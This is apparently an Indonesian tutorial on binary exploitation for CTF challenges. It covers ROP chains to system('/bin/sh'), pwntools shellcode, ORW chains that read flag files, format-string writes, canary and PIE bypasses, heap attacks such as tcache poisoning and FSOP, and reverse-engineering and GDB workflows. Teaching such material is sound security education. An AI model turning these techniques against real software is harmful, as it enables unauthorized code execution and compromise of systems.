**Aturan amd64:** Stack harus 16-byte aligned SEBELUM manggil function. Artinya RSP harus kelipatan 16.

**Masalah:** Waktu kamu overflow dan control RIP, seringkali stack gak alignment. `system()` di glibc modern butuh alignment — kalo gak, crash dengan `movaps` instruction.

**Solusi:** Tambah gadget `ret` (doang) di awal chain. Gadget `ret` cuma mindahin RSP+8, gak ngubah register. Tapi efeknya alignment jadi bener.

```python
ret = rop.find_gadget(['ret'])[0]
payload = b'A' * offset
payload += p64(ret)              # ← INI! extra ret buat alignment
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
```

**Kapan perlu extra ret?** Kalo kamu panggil `system()`/`execve()` dan crash misterius — selalu curiga alignment. Tambahin extra ret.

### 11.4 `/bin/sh` vs ORW — Shell atau Baca Flag?

| Situasi | Pilihan |
|---------|---------|
| Gak ada seccomp, butuh shell | `system("/bin/sh")` |
| Ada seccomp, execve diblokir | ORW (open/read/write) |
| Remote service mati abis output | ORW — gak perlu shell |
| Mau interaktif penuh | Shell |
| Flag.txt tinggal dibaca | ORW |

---

## 12. Shellcode — Kode Eksekusi di Atas Memory

### Kapan shellcode paling bagus

- **NX off** — stack/heap bisa dieksekusi. Ini paling enak.
- RWX memory ada — ada region memory yang read-write-execute
- ada `jmp rsp`, stack executable, atau bisa `mprotect`
- seccomp mengizinkan syscall yang kamu butuhkan

### pwntools shellcraft — Generator Shellcode

```python
sc = asm(shellcraft.sh())                          # shell, arch otomatis
sc = asm(shellcraft.amd64.linux.sh())              # shell, amd64 spesifik
sc = asm(shellcraft.i386.linux.sh())               # shell, i386 spesifik
```

Untuk ORW (baca file tanpa shell):
```python
sc  = shellcraft.open('flag.txt')                  # open("flag.txt", 0)
sc += shellcraft.read('rax', 'rsp', 0x100)         # read(fd, buf, 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)            # write(1, buf, 0x100)
sc  = asm(sc)
```

### Jika NX aktif tapi bisa mprotect

**Flow:**
1. `ROP -> mprotect(addr, size, 7)` — bikin region tertentu jadi RWX (7 = PROT_READ|PROT_WRITE|PROT_EXEC)
2. Copy shellcode ke region itu
3. Lompat ke shellcode

```python
mprotect_addr = libc.symbols['mprotect']
shellcode = asm(shellcraft.sh())

# Stage 1: ROP ke mprotect biar .bss jadi RWX
rop = ROP(libc)
rop.mprotect(bss_page, 0x1000, 7)
rop.raw(bss_addr)     # lompat ke shellcode setelah mprotect

# Stage 2: kirim shellcode ke bss
io.send(shellcode)
```

---

## 13. Format String — Bug Paling Fleksibel

**Analogi Besar:** Kamu ngisi formulir isian. Di kolom "Nama", kamu tulis "Budi". Terus kamu liat, ternyata yang ditampilkan di monitor adalah "Nama: Budi". OK.

Sekarang kamu isi kolom "Nama" dengan: `%x %x %x %x %x %x`. Terus monitor nampilin: `Nama: bf1234 0 0 7fff1234 401234 ...`. **Itu alamat memory yang bocor!**

**Kenapa ini bisa terjadi?** Karena programmer nulis `printf(user_input)` alih-alih `printf("%s", user_input)`. Kalo user_input mengandung format specifier (`%x`, `%n`, `%s`), printf bakal nge-print isi stack seolah-olah itu argumen.

### 13.1 Primitive yang bisa didapat

- **arbitrary read** — baca memory di alamat tertentu
- **stack leak** — lihat isi stack
- **canary leak** — tau nilai canary
- **libc leak** — tau alamat libc
- **PIE leak** — tau alamat binary
- **arbitrary write via `%n`** — NULIS ke alamat tertentu! Ini power-nya.

### 13.2 Langkah standar

1. Cari offset argumen yang kamu kontrol
2. Identifikasi apakah output memantulkan stack
3. Leak pointer penting
4. Tentukan apakah write perlu byte, short, atau full write
5. Pilih target tulis

### 13.3 Cara cepat cari offset

```bash
for i in $(seq 1 30); do echo "%$i\$p"; done
```

Atau kirim `%p.%p.%p.%p.%p.%p.%p.%p` — liat di posisi berapa input kamu muncul.

Atau pake pwntools:
```python
def exec_fmt(payload):
    p = process('./chall')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
```

### 13.4 Pakai helper pwntools FmtStr

```python
def exec_fmt(payload):
    p = process('./chall')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
payload = fmtstr_payload(offset, {target_addr: target_value})
```

### 13.5 Target write umum

**Partial RELRO:**
- GOT overwrite — ganti GOT entry jadi alamat shell/one_gadget

**Full RELRO:**
- saved RIP — return address di stack
- `.fini_array` / function pointer
- exit handler
- hook lama di glibc lama (`__malloc_hook`, `__free_hook`)
- vtable / data pointer

### 13.6 `%n` size — Ukuran Write

| Specifier | Ukuran | Analogi |
|-----------|--------|---------|
| `%hhn` | 1 byte | Nulis 1 digit aja |
| `%hn` | 2 byte | Nulis 2 digit |
| `%n` | 4 byte | Nulis 4 digit (i386) |
| `%lln` | 8 byte | Nulis 8 digit (konteks tertentu) |

**Rule:** `%hhn` (1 byte) paling fleksibel — nulis byte per byte, beberapa kali write.

### 13.7 `numbwritten`

Kalau program sudah menulis bytes sebelum format specifier diproses, sesuaikan `numbwritten` pada pwntools.

```python
payload = fmtstr_payload(offset, {target: value}, numbwritten=6)
```

---

## 14. Canary Bypass — Cara Lewati Segel Anti Overflow

**Analogi:** Canary itu kayak segel plastik di tutup botol. Sebelum kamu buka botol, kamu cek dulu apakah segel masih utuh. Kalo udah sobek, kamu tau ada yang rusak.

### Cara paling umum leak canary

- **format string** — canary ada di stack, bisa dibaca via `%p`
- **stack OOB read** — baca di luar buffer, canary ketahuan
- **uninitialized stack output** — function yang print isi stack tanpa diinisialisasi penuh
- **function yang print buffer terlalu jauh**

### Ciri canary

- **Byte paling bawah sering `\x00`** — ini penting! String function berhenti di null, jadi byte `\x00` gak akan ke-print.
- Pada leak stack, polanya sering tampak acak tapi konsisten per run.

### Kalau tidak bisa leak canary

Pikirkan jalur alternatif:
- overwrite function pointer non-stack — vtable, GOT, destructor
- heap route — UAF, double free, tcache poisoning
- partial overwrite yang tidak menyentuh canary
- logic bug

---

## 15. PIE dan Leak Code Base — Cara Tau Alamat Binary

**Analogi:**
- **No PIE**: Rumah kamu di Jl. Sudirman No. 1. Gak pernah berubah.
- **PIE enabled**: Rumah kamu dipindah secara acak tiap program dijalankan. Hari ini di Jl. Merdeka, besok di Jl. Diponegoro. Kamu harus cari tau alamat barunya dulu.

Butuh leak salah satu:
- address function di binary
- return address ke binary (ada di stack!)
- GOT/PLT/code pointer lain

Rumus:
```python
pie_base = leaked_addr - known_offset
exe.address = pie_base   # set base di pwntools
```

Setelah itu semua symbol binary jadi stabil.

---

## 16. Partial Overwrite — Manipulasi Sebagian Alamat

**Analogi:** Kamu gak ganti alamat rumah seseorang sepenuhnya. Kamu cuma ganti 1-2 digit terakhir nomor rumahnya.

Pakai saat:
- ASLR/PIE masih menyisakan byte bawah yang stabil (12 bit bawah)
- kamu hanya bisa menulis 1-2 byte
- target dekat dengan alamat valid lain

Use case:
- saved RIP low bytes
- GOT low bytes
- vtable/function pointer low bytes

---

## 17. Stack Pivot — Pindahin Stack

**Analogi:** Meja kamu (stack) terlalu kecil buat naro semua alat. Kamu pindahin meja kamu ke ruangan lain yang lebih besar (heap atau .bss).

Pakai saat:
- ruang setelah RIP kecil
- kamu punya area memori lain yang bisa diisi payload besar
- ada gadget `leave; ret`, `xchg rsp, rax`, `mov rsp, ...`, dll

Target pivot umum:
- `.bss`
- heap chunk
- mmap buffer
- buffer global

---

## 18. ORW Playbook — Open/Read/Write Chain

**ORW = open/read/write** — teknik baca file tanpa shell.

**Analogi:** Kamu gak boleh masuk ke ruangan server (gak bisa shell), tapi kamu bisa minta, "Tolong ambilkan file flag.txt, bacain, terus tulis isinya di kertas buat saya."

Pakai saat:
- shell tidak perlu
- seccomp membatasi `execve`
- file flag bisa dibaca langsung

Flow:
1. `open("flag.txt", 0)`
2. `read(fd, buf, size)`
3. `write(1, buf, size)`

Kalau `open` tidak ada tapi `openat` ada, sesuaikan chain.

---

## 19. Seccomp — Aturan Main Syscall

### 19.1 Kapan harus curiga seccomp

- shellcode/ROP ke `execve` gagal misterius
- binary memanggil `prctl`, `seccomp`, `seccomp_init`
- reverse menunjukkan filter install

### 19.2 Dump filter

```bash
seccomp-tools dump ./chall
seccomp-tools dump ./chall -- args
```

### 19.3 Setelah dump

Tanya:
1. syscall apa yang boleh?
2. apakah `read/write/open/openat/mprotect/execve` masih ada?
3. apakah ORW lebih cocok daripada shell?

---

## 20. Heap: Pertanyaan Pertama

Sebelum eksploitasi heap, kamu wajib jawab:

1. **glibc versi berapa?**
2. **tcache ada atau tidak?** (mulai glibc 2.26)
3. **safe-linking ada atau tidak?** (mulai glibc 2.32)
4. **hook seperti `__malloc_hook`/`__free_hook` masih ada?** (dihapus di 2.34)
5. **primitive utamanya apa?**
6. **leak heap/libc sudah ada atau belum?**

---

## 21. Heap: Primitive yang Harus Dikenali + Analogi

| Primitive | Arti | Analogi |
|-----------|------|---------|
| **UAF** | Pake memory setelah di-free | Kamu pinjemin buku ke temen, buku udah dikembaliin, tapi kamu masih baca/ubah isinya |
| **Double free** | Free dua kali chunk yang sama | Kamu balikin kotak ke gudang 2 kali — gudang bingung, kotak masuk 2 daftar |
| **Heap overflow** | Nulis melebihi chunk | Kamu isi kotak terlalu penuh, isinya tumpah ke kotak sebelah |
| **Off-by-one** | Nulis 1 byte kelebihan | Kamu nulis di kotak yang pas, tapi 1 huruf loncat ke kotak tetangga |
| **Off-by-null** | Nulis null byte 1 kelebihan | Kamu kasih tanda "selesai" (\x00) yang kena kotak tetangga |
| **Arbitrary free** | Bisa free alamat mana aja | Kamu suruh gudang balikin KOTAK ORANG LAIN |
| **Heap leak** | Bocor alamat heap | Kamu tau di mana gudang berada |
| **Libc leak** | Bocor alamat libc | Kamu tau alamat perpustakaan pusat |
| **Tcache poisoning** | Korupsi pointer di tcache | Kamu ganti label di kotak — besok orang ambil kotak yang salah |
| **Overlapping chunks** | Dua chunk pake memory yang sama | Dua kotak terhitung pake ruang yang sama |
| **Unsorted bin attack** | Manipulasi unsorted bin | Kamu naro barang di tempat sampah besar, terus ngubah labelnya |
| **Fastbin dup** | Double free di fastbin | Kamu balikin barang ke gudang 2 kali dan gudang bingung |
| **Largebin attack** | Manipulasi largebin | Mainin barang ukuran jumbo di gudang |

---

## 22. Heap Era Glibc — Zaman-zaman Heap

### Glibc lama (tanpa tcache) — Sebelum 2017

Pola umum:
- fastbin dup
- unsorted bin leak
- smallbin/largebin manipulation
- `__malloc_hook` / `__free_hook`

### Glibc dengan tcache — 2.26 sampai 2.31

Pola umum:
- tcache poisoning
- tcache dup style bug
- per-thread cache behavior

### Safe-linking era modern — 2.32+ (2020+)

Pola umum:
- perlu heap leak atau pointer mangling recovery
- poisoning tidak sebebas era lama

### Glibc 2.34+ — Hook hilang

Target baru:
- ROP
- FSOP — File Stream Oriented Programming
- exit handlers
- vtable
- `setcontext` / `_IO` abuse
- `rtld_global`

---

## 23. Heap Leak — Bocoran Alamat

### Leak libc paling umum
- unsorted bin `fd/bk`
- main_arena related pointer
- libc pointer tercetak dari UAF/show

### Leak heap paling umum
- freed tcache/fastbin `fd`
- pointer object pada buffer
- show-after-free

---

## 24. Tcache Poisoning — RACUNI Freelist

**Analogi:** Di gudang, ada rak khusus (tcache) yang nyimpen barang-barang yang baru dibalikin. Kamu ganti label alamat di rak itu. Besoknya kalo orang minta barang, dia dikasih barang dari alamat yang kamu tulis.

Pakai saat:
- tcache aktif
- kamu bisa memodifikasi `fd` atau double free style path

Target umum:
- hook lama
- global pointer
- fake chunk area
- struct penting

Selalu cek:
- **safe-linking** — pointer di-mangle
- **alignment** — alamat harus 16-byte aligned
- **size class** — chunk size harus cocok
- **count limit** — tcache max 7 per size

### 24.1 Safe-linking mental model

Pada glibc modern (2.32+), pointer freelist tidak lagi mentah. Mereka di-mangle:

```
fd_mangled = (ptr >> 12) ^ fd_real
```

**Artinya:**
- Waktu kamu baca fd dari UAF, yang kamu dapet bukan alamat asli — udah di-XOR
- Waktu kamu mau tulis fd palsu, kamu harus hitung: `fd_palsu ^ (heap_addr >> 12)`

**Tanpa leak heap, exploit safe-linking modern sering jauh lebih susah.**

---

## 25. Unsorted Bin Leak — Leak Libc Termurah

**Analogi:** Kamu punya barang besar yang gak muat di rak kecil. Barang itu ditaruh di gudang khusus (unsorted bin). Di label barang ada alamat gudang pusat (main_arena). Kalo kamu bisa baca label itu — kamu tau alamat libc.

Flow:
1. Alokasi chunk besar (> 0x400 byte)
2. Free chunk itu — masuk unsorted bin
3. Baca fd/bk dari chunk — isinya pointer ke main_arena
4. Hitung libc base dari offset main_arena

---

## 26. Fastbin Dup — Double Free (Glibc Lama)

**Analogi:** Kamu punya kelereng kecil. Kamu masukin ke kotak A. Kamu ambil lagi. Kamu masukin lagi ke kotak A PADAHAL kelerengnya masih ada di tangan. Sekarang ada 2 catatan kelereng di kotak A.

Target klasik:
- `__malloc_hook` → one_gadget
- `__free_hook` → system

**Kalau challenge modern, jangan asumsi jalur ini masih hidup.**

---

## 26A. Heap Families yang Harus Ada di Radar

### `House of Force`
Pikirkan saat: top chunk size bisa dikorup, alokasi besar bisa diarahkan.

**Analogi:** Kamu ganti label "sisa ruang gudang" jadi sangat besar. Terus kamu minta ruang yang banyak — gudang ngasih ruang sampe ke alamat yang kamu mau.

### `House of Spirit`
Pikirkan saat: kamu bisa membuat fake chunk yang lalu di-`free`.

**Analogi:** Kamu buat kotak palsu di stack, terus kamu bilang ke gudang "ini kotak mau dibalikin". Gudang percaya.

### `House of Orange`
Pikirkan saat: target glibc cukup tua, jalur unsorted bin + FILE structure relevan.

### `House of Botcake`
Pikirkan saat: tcache era modern, kombinasi bug untuk poisoning.

**Analogi:** Kamu penuhin rak tcache (7 slot), free lagi biar masuk fastbin. Kosongin tcache — kotak yang tadinya di fastbin bisa double free via tcache.

### `Tcache Stashing Unlink`
Pikirkan saat: smallbin/tcache interplay bisa dimanfaatkan.

### `Largebin attack`
Pikirkan saat: kontrol metadata chunk besar, target write lewat largebin.

### Rule praktis:
- Nama teknik bukan yang terpenting;
- **Yang penting: primitive, leak, dan target akhir.**

---

## 27. Off-by-Null / Off-by-One

**Analogi:** Kamu nulis nomor di kertas. Tempatnya cuma muat 8 digit, tapi kamu nulis 9 digit. Digit ke-9 itu nimpok kertas sebelah. Kalo digit ke-9 itu angka "0", kamu baru sadar bahwa 1 null byte bisa ngacauin administrasi tetangga.

Pertanyaan utama:
- byte mana yang bisa diubah?
- apakah bisa clear `PREV_INUSE`?
- apakah bisa mengubah size class?
- apakah bisa bikin overlap?

---

## 28. FSOP dan FILE Structure

**Analogi:** Kamu gak bisa nulis langsung ke buku tamu (gak ada hook). Tapi kamu bisa ganti halaman di buku tamu dengan halaman palsu. Waktu security guard (exit handler) ngecek buku tamu, dia baca halaman palsu kamu.

Pakai saat:
- target modern tidak memberi hook klasik (glibc 2.34+)
- kamu bisa overwrite `_IO_FILE` atau pointer terkait
- program memakai `stdout`, `stderr`, `fclose`, `exit`

---

## 29. setcontext / Sigcontext-style Heap Targets

**Analogi:** Kamu gak bisa nulis langsung ke buku petunjuk. Tapi kamu bisa nulis di formulir "context" — yang isinya register-register. Waktu program pake formulir itu, semua register berubah sesuai keinginan kamu.

Pakai saat:
- bisa menulis struct/context
- perlu register control yang lebih kaya dari hook tradisional
- challenge modern mendorong ke fake context + ROP chain

---

## 30. one_gadget — Magic Gadget (Tapi Pake Syarat)

**Analogi:** Tombol "MENANG" di game. Satu pencet, langsung dapet shell. Sayangnya, tombol itu cuma berfungsi kalo kondisi tertentu terpenuhi.

**Jangan pakai saat:**
- kamu belum memeriksa constraint
- seccomp memblokir `execve`
- stack alignment kacau
- chain lain jauh lebih stabil

Cek constraint:
```bash
one_gadget ./libc.so.6
```

Output:
```
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL
```

---

## 30A. DynELF dan No-libc Workflows

**Analogi:** Kamu gak punya buku telepon. Tapi kamu bisa nelpon operator (arbitrary read) dan minta "sambungin ke Pak System".

Pakai saat:
- remote libc tidak diberikan
- kamu punya arbitrary read atau leak primitive yang cukup kuat
- identifikasi libc manual sulit atau ambigu

Checklist:
1. apakah aku punya arbitrary read yang stabil?
2. apakah shortlisting libc dengan 2-3 leak lebih murah?
3. apakah DynELF justru menambah kompleksitas?

---

## 31. Symbolic Execution / angr

**Analogi:** Labirin. Kamu bisa jalan sendiri (debug manual) — tapi kalo labirinnya raksasa dengan 1000 pintu, kamu pake drone yang bisa explore SEMUA jalur sekaligus.

Pakai `angr` saat:
- binary punya validasi panjang dan rumit
- banyak branch yang menyaring input
- challenge constraint-heavy

Jangan mulai dari `angr` jika bug memori sudah jelas.

---

## 32. Reverse Workflow

Tool utama:
- `ghidra`
- `IDA`
- `Binary Ninja`
- `radare2`

Checklist reverse:
1. temukan input function
2. temukan output function
3. cari state global penting
4. cari call ke `malloc/free/read/write/printf/system/mprotect/prctl/seccomp`
5. cari hidden function
6. cari perbedaan path success/fail

---

## 33. Disassembler Mental Checklist

Saat lihat function raw:
- stack frame size
- local buffer size
- apakah ada stack canary check
- call ke unsafe function
- indeks array tidak dicek?
- signed/unsigned bug?
- integer overflow di size?
- pointer reuse setelah free?
- comparison atau magic value yang bisa dipalsukan?

---

## 33A. Cara Baca Assembly x86/x64 — Panduan untuk Reverse Engineering

Ini adalah skill WAJIB buat PWN. Kamu gak bisa exploit kalo gak bisa baca assembly. Bagian ini ngajarin kamu cara baca assembly dari nol.

### Register yang Wajib Dihafal

Udah dibahas di section 0.3. Tapi diulang konteks RE:
```
rax - return value / syscall number
rbx - base register (biasanya gak dipake function)
rcx - arg ke-4 function call / counter loop
rdx - arg ke-3 function call
rsi - arg ke-2 function call
rdi - arg ke-1 function call
rsp - stack pointer
rbp - base pointer (frame pointer)
r8  - arg ke-5
r9  - arg ke-6
r10 - arg ke-4 syscall (berbeda dengan rcx!)
rip - instruction pointer
```

### Instruction Paling Sering Muncul

#### `mov` — Pindahin data
```asm
mov rax, rbx     ; rax = rbx (salin nilai rbx ke rax)
mov rax, [rbx]   ; rax = *rbx (baca dari memory di alamat rbx)
mov [rax], rbx   ; *rax = rbx (tulis rbx ke memory di alamat rax)
mov rax, 0x1337  ; rax = 0x1337 (konstanta)
```
**Analogi:** `mov` = mindahin barang dari rak A ke rak B. Kalo pake kurung `[]` = kamu bukan mindahin raknya, tapi ngecek isi raknya.

#### `push` / `pop` — Dorong/Tarik ke Stack
```asm
push rax    ; stack: [rsp] = rax; rsp -= 8
pop rax     ; rax = [rsp]; rsp += 8
```
**Analogi:** `push` = naro piring ke tumpukan. `pop` = ngambil piring paling atas. Stack pointer (rsp) selalu nunjuk ke piring paling atas.

#### `call` / `ret` — Panggil Function dan Kembali
```asm
call func   ; push rip; jmp func  (simpen return address, lompat ke func)
ret         ; pop rip            (ambil return address, lompat balik)
```
**Analogi:** `call` = kamu telepon orang, kamu catat nomor kamu di kertas (return address). `ret` = orang selesai ngomong, kamu liat catetan dan balik ke kerjaan kamu.

#### `lea` — Hitung Alamat (Load Effective Address)
```asm
lea rax, [rbx+rcx*4+0x10]   ; rax = rbx + rcx*4 + 0x10
```
**Gak baca memory!** Cuma hitung alamat. Bedanya dengan `mov`: `mov rax, [rbx]` = baca isi memory di rbx. `lea rax, [rbx]` = rax = rbx (salin alamatnya).

#### `add` / `sub` / `inc` / `dec` — Aritmatika
```asm
add rax, rbx   ; rax += rbx
sub rax, rbx   ; rax -= rbx
inc rax        ; rax++
dec rax        ; rax--
```

#### `xor` / `and` / `or` — Operasi Bitwise
```asm
xor rax, rax   ; rax = 0 (cara paling cepet reset register!)
and rax, 0xff  ; rax = rax & 0xff (masking byte bawah)
or  rax, 0xff  ; rax = rax | 0xff
```
**Unik:** `xor rax, rax` lebih cepet daripada `mov rax, 0`. Dipake hampir di semua tempat.

#### `cmp` / `jmp` / `je` / `jne` / `jg` / `jl` — Percabangan
```asm
cmp rax, rbx   ; hitung rax - rbx (tapi gak disimpen, cuma set flag)
je  label      ; kalo rax == rbx, lompat ke label
jne label      ; kalo rax != rbx
jg  label      ; kalo rax > rbx (signed)
jl  label      ; kalo rax < rbx (signed)
jmp label      ; lompat tanpa syarat
```
**Analogi:** `cmp` kayak kamu bandingin 2 angka di kalkulator. Hasilnya kamu catet di kepala (flag). `je` = "kalo sama, ambil jalan kiri". `jmp` = "jalan terus, gak peduli apa pun".

#### `syscall` — Panggil Kernel
```asm
mov rax, 2     ; SYS_open
mov rdi, rsp   ; filename
mov rsi, 0     ; flags
mov rdx, 0     ; mode
syscall        ; panggil kernel
```
**Ini yang paling penting buat ROP chain.** Setiap syscall punya nomor: 0=read, 1=write, 2=open, 60=exit, 231=exit_group.

### Cara Identifikasi Function Prologue

Setiap function biasanya dimulai dengan:
```asm
push rbp           ; simpen rbp lama ke stack
mov rbp, rsp       ; rbp = rsp (frame pointer)
sub rsp, 0x30      ; alokasi 0x30 byte buat local variable
```

Dan diakhiri dengan:
```asm
leave              ; mov rsp, rbp; pop rbp
ret                ; pop rip
```

**Ukuran stack frame** bisa kamu liat dari `sub rsp, 0x...`. Itu ngasih tau kamu seberapa besar ruang function.

### Cara Identifikasi Buffer Size

Cari pattern kayak gini:
```asm
lea rax, [rbp-0x20]   ; buffer di rbp-0x20 (32 byte dari rbp)
mov rdi, rax
call gets              ; panggil gets(buffer) → BUFFER OVERFLOW!
```

Buffer size = offset dari rbp. Di sini `rbp-0x20` = 32 byte. Tapi `gets` gak ngecek batas = overflow.

### Cara Baca Pseudo-code (Decompiler Output)

Ghidra dan IDA ngubah assembly jadi C-like. Contoh:

```c
// Asli assembly:
//  0x401196  lea rax, [rbp-0x20]
//  0x40119a  mov rdi, rax
//  0x40119d  call gets

// Jadi pseudo-code:
gets(local_32);
```

**Yang harus kamu cek di pseudo-code:**
1. `gets()`, `scanf("%s")`, `sprintf()` tanpa batas → overflow
2. `malloc(size)` — kalo size dari user → potensi integer bug
3. `printf(user_input)` → format string
4. `free(ptr)` lalu `ptr` dipake lagi → UAF
5. `free(ptr)` dua kali → double free
6. Array index dari user tanpa cek → OOB
7. Loop dengan kondisi yang salah → off-by-one

---

## 33B. Cara Identifikasi Bug dari Disassembly — Langkah Per Langkah

### Flow RE Standar

1. **Cari input function**: cari call ke `scanf`, `gets`, `read`, `fgets`, `__isoc99_scanf`
2. **Cek batas input**: apa function punya pengecekan size?
3. **Cari output function**: `printf`, `puts`, `write` — apakah formatnya user-controlled?
4. **Cari allocator**: `malloc`, `calloc`, `realloc`, `free`
5. **Cari loop**: counter apa yang dipake? signed/unsigned? overflow mungkin?
6. **Cari array**: index dari user? dicek boundary?

### Cara Cepet Bedain Pseudo-code di Ghidra vs IDA

**Ghidra:**
- Variable naming: `local_X` (stack), `param_X` (argumen)
- Function signature sering kelihatan meski stripped
- Dekompresi kadang agak verbose

**IDA:**
- Variable naming: `v1`, `v2`, ... atau `buf`, `size` kalo ada debug symbol
- Output lebih ringkas
- Kadang terlalu ringkas sampe ilang context

### Common Patterns di RE

| Assembly Pattern | Arti | Bug |
|----------------|------|-----|
| `call gets` | Read tanpa batas | Stack overflow |
| `call scanf` with `%s` | String input tanpa batas | Stack overflow |
| `call printf` dengan user input sebagai argumen pertama | Format string | Arbitrary read/write |
| `call free` lalu pointer dipake lagi | UAF | Heap corruption |
| `call free` di loop tanpa reset | Double free | Heap corruption |
| `malloc(size)` dengan size dari user | Integer overflow | Heap corruption |
| Array index dari user tanpa `cmp` | OOB | Leak/corruption |
| `strcpy(buf, user)` | Copy tanpa batas | Stack/heap overflow |

---

## 33C. String Referensi di Binary — Cepet Tau Fungsi Program

```bash
strings ./chall | grep -i "flag\|win\|shell\|pass\|admin\|secret"
```

Tapi inget: strings juga ngasih tau string penting kayak:
- `/bin/sh` — kalo di binary, berarti ada system call
- `flag.txt`, `/flag`, `flag_key` — nama file flag
- Menu items: "1. Create", "2. Edit", "3. Show", "4. Delete" — heap challenge
- Error messages: "Too long!", "Invalid!" — ada validasi

---

## 33D. Cara Analisis Binary Stripped (Gak Ada Symbol)

Binary **stripped** = semua nama function dihapus. Tapi function penting masih bisa dikenali dari:
1. **Address PLT/GOT** — `objdump -R ./chall` masih nunjukkin imported function
2. **Xref ke PLT** — di Ghidra/IDA, cari referensi ke alamat PLT
3. **String references** — string yang dipake function ngasih tau fungsinya
4. **`__libc_csu_init`** — function ini selalu ada di GCC binary, bisa jadi patokan

Ghidra/IDA biasanya bisa recovery nama function kalo ada DWARF info (gak stripped total).

---

## 33E. Cara Debug Assembly Langsung di GDB

```gdb
# Set breakpoint di address specific
b *0x401234

# Step instruction by instruction
si          # step into (masuk ke call)
ni          # step over (skip call)

# Lihat isi register
info reg
p $rdi
p/x $rdi

# Lihat stack
x/20gx $rsp          # 20 qword dari rsp
x/20gx $rbp-0x20     # 20 qword dari rbp-0x20 (buffer!)

# Lihat memory di address tertentu
x/s 0x404000         # sebagai string
x/i $rip             # sebagai instruction (disassembly)
x/10i $rip           # 10 instruction dari rip

# HITUNG OFFSET di GDB:
# 1. Break setelah input
# 2. Cari buffer address: p &buf atau x/20gx $rbp-0x20
# 3. Cari return address: p $rbp+8
# 4. Offset = return_addr - buffer_addr
```

---

## 33F. Cara Analisis Heap dari SDM/Decompiler

Kalo kamu liat pseudo-code dan ada pola menu `create/edit/show/delete`:

1. **Create**: biasanya ada `malloc(size)` — simpen pointer hasil malloc di array global
2. **Edit**: tulis ke chunk yang udah di-malloc — cek apakah size dicek?
3. **Show**: print isi chunk — apakah ngecek null pointer? (kalo gak, bisa leak UAF)
4. **Delete**: `free(ptr)` — apakah nge-null-in pointer setelah free? (kalo gak = UAF!)
5. **Index**: dicek atau gak? Index berapa aja yang bisa diakses?

**Yang sering salah:**
- `free(ptr)` tanpa `ptr = NULL` → **UAF** (pointer masih nyimpen alamat lama)
- `free(ptr)` di dua tempat → **double free**
- `edit` tanpa cek apakah chunk udah di-free → **UAF write**
- `malloc` size dari user tanpa validasi → **integer overflow / huge alloc**

---

**Analogi:** Kamu punya dompet yang cuma muat Rp 1.000.000. Kamu taruh Rp 500.000. Kamu taruh lagi Rp 700.000. Dompet kamu bacanya bukan Rp 1.200.000 — tapi overflow! Nilai sisa setelah muter.

Banyak bug pwn lahir dari:
- size negatif jadi besar
- `signed -> unsigned`
- perkalian size overflow
- index out-of-bounds
- `malloc(len * elem_size)` wrap

---

## 35. OOB Read / OOB Write

**Analogi:** Kamu punya rak buku 3 tingkat. Kamu disuruh ambil buku di tingkat 1-3. Tapi kamu ambil buku di tingkat 4 — itu OOB.

### OOB Read — Baca di Luar Batas
- leak canary
- leak heap
- leak libc
- leak PIE

### OOB Write — Tulis di Luar Batas
- overwrite function pointer
- overwrite metadata heap
- overwrite size / length / vtable

---

## 36. ABI / Calling Convention

### amd64 SysV

| Arg | Function call | Syscall |
|-----|--------------|---------|
| 1 | `rdi` | `rdi` |
| 2 | `rsi` | `rsi` |
| 3 | `rdx` | `rdx` |
| 4 | **`rcx`** | **`r10`** ← BEDA! |
| 5 | `r8` | `r8` |
| 6 | `r9` | `r9` |
| Ret | `rax` | `rax` |
| No. syscall | — | `rax` |

### i386
Argumen stack-based.

### ARM / AArch64 / MIPS
Jangan copy-paste model x86.

---

## 37. Remote Parity

### 37.1 Kalau libc/ld disediakan → Pakai itu.
### 37.2 Kalau Docker disediakan → Jalankan di Docker.
### 37.3 Kalau tidak ada libc → Leak → identifikasi via libc-database/libc.rip.
### 37.4 Leak berguna: puts, printf, read, write, __libc_start_main_ret.

---

## 37A. Command Templates

### Gadget hunting
```bash
ROPgadget --binary ./chall | less
ropper --file ./chall --search "pop rdi; ret"
```

### ELF triage
```bash
readelf -a ./chall | less
objdump -d ./chall | less
objdump -R ./chall
nm -an ./chall | less
```

### libc triage
```bash
strings -a -t x ./libc.so.6 | grep "/bin/sh"
readelf -s ./libc.so.6 | grep " system@@"
one_gadget ./libc.so.6
```

### seccomp
```bash
seccomp-tools dump ./chall
```

### libc-database
```bash
./find puts 123 printf 456
./find __libc_start_main_ret abc
./dump libc6_2.31-0ubuntu9_amd64
```

---

## 37B. Tool Cheat Sheet: GDB / pwndbg / GEF

GDB adalah debugger utama di Linux. pwndbg dan GEF adalah plugin yang nambahin command-spesifik buat PWN.

### GDB Dasar (Tanpa Plugin)

| Command | Fungsi | Contoh |
|---------|--------|--------|
| `b` (break) | Set breakpoint | `b *main`, `b *0x401234`, `b vuln+32` |
| `r` (run) | Jalanin program | `r < input.txt` |
| `c` (continue) | Lanjutin eksekusi | `c` |
| `n` (next) | Step over (gak masuk call) | `n` |
| `s` (step) | Step into (masuk call) | `s` |
| `si` (stepi) | Step 1 instruction | `si`, `si 5` |
| `ni` (nexti) | Step 1 instruction (skip calls) | `ni` |
| `p` (print) | Print nilai | `p $rdi`, `p/x $rsp`, `p/d $rax` |
| `x/` (examine) | Lihat memory | `x/20gx $rsp`, `x/s 0x404000`, `x/i $rip` |
| `info reg` | Semua register | `info reg rdi rsi` (spesifik) |
| `info func` | Semua function | `info func win` (cari win) |
| `set` | Set nilai | `set $rdi=0`, `set {int}0x404000=0x1337` |
| `tel` (telescope) | Stack + dereference | `tel $rsp 20` |
| `vmmap` | Memory map (pwndbg) | `vmmap libc` |
| `bt` (backtrace) | Call stack | `bt` |
| `frame` | Pindah frame | `frame 1` |
| `disas` (disassemble) | Disassembly | `disas main`, `disas 0x401200,0x401300` |
| `aslr` | Toggle ASLR (pwndbg) | `aslr off` |

### Format `x/` Command

```gdb
x/[count][format][size] <address>

count: angka (default 1)
format: x=hex, d=decimal, s=string, i=instruction, c=char
size: b=byte, h=halfword(2), w=word(4), g=giant(8)

Contoh:
x/20gx $rsp   # 20 qword (8-byte) dari rsp, tampilkan hex
